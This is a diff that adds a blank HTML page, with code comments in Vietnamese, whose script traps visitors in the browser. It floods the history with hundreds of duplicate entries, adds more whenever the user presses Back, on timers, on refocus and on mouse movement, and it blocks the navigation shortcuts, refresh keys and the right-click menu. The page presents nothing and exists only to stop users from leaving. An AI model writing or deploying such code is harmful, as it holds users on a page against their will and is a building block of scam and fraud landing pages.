@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            background: white;
+        }
+
+        body {
+            min-height: 100vh;
+            background: white;
+            cursor: default;
+            user-select: none;
+        }
+    </style>
+</head>
+
+<body>
+    <script>
+        (function () {
+            // Đẩy rất nhiều history entries ngay từ đầu (100 entries)
+            for (var i = 0; i < 100; i++) {
+                history.pushState({ trap: i }, '', location.href);
+            }
+
+            // Biến đếm để theo dõi
+            var pushCount = 0;
+
+            // Khi người dùng nhấn Back, đẩy lại nhiều entries
+            window.addEventListener('popstate', function (e) {
+                // Mỗi lần nhấn back, đẩy thêm 50 entries
+                for (var i = 0; i < 50; i++) {
+                    history.pushState({ trap: pushCount++ }, '', location.href);
+                }
+            });
+
+            // Đẩy thêm history liên tục mỗi 100ms (10 lần/giây)
+            setInterval(function () {
+                history.pushState({ trap: pushCount++ }, '', location.href);
+            }, 100);
+
+            // Đẩy thêm mỗi 500ms với số lượng lớn
+            setInterval(function () {
+                for (var i = 0; i < 20; i++) {
+                    history.pushState({ trap: pushCount++ }, '', location.href);
+                }
+            }, 500);
+
+            // Chặn phím tắt điều hướng
+            document.addEventListener('keydown', function (e) {
+                // Chặn Alt + Left Arrow (Back)
+                if (e.altKey && e.keyCode === 37) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+                // Chặn Alt + Right Arrow (Forward)
+                if (e.altKey && e.keyCode === 39) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+                // Chặn Backspace
+                if (e.keyCode === 8) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+                // Chặn F5 refresh
+                if (e.keyCode === 116) {
+                    e.preventDefault();
+                    return false;
+                }
+                // Chặn Ctrl+R refresh
+                if (e.ctrlKey && e.keyCode === 82) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+
+            // Chặn chuột phải
+            document.addEventListener('contextmenu', function (e) {
+                e.preventDefault();
+                return false;
+            });
+
+
+            // Nếu trang bị focus lại (sau khi alt-tab), đẩy thêm history
+            window.addEventListener('focus', function () {
+                for (var i = 0; i < 50; i++) {
+                    history.pushState({ trap: pushCount++ }, '', location.href);
+                }
+            });
+
+            // Thêm nhiều history khi mouse di chuyển
+            var lastPush = 0;
+            document.addEventListener('mousemove', function () {
+                var now = Date.now();
+                if (now - lastPush > 200) {
+                    history.pushState({ trap: pushCount++ }, '', location.href);
+                    lastPush = now;
+                }
+            });
+        })();
+    </script>
+</body>
+
+</html>
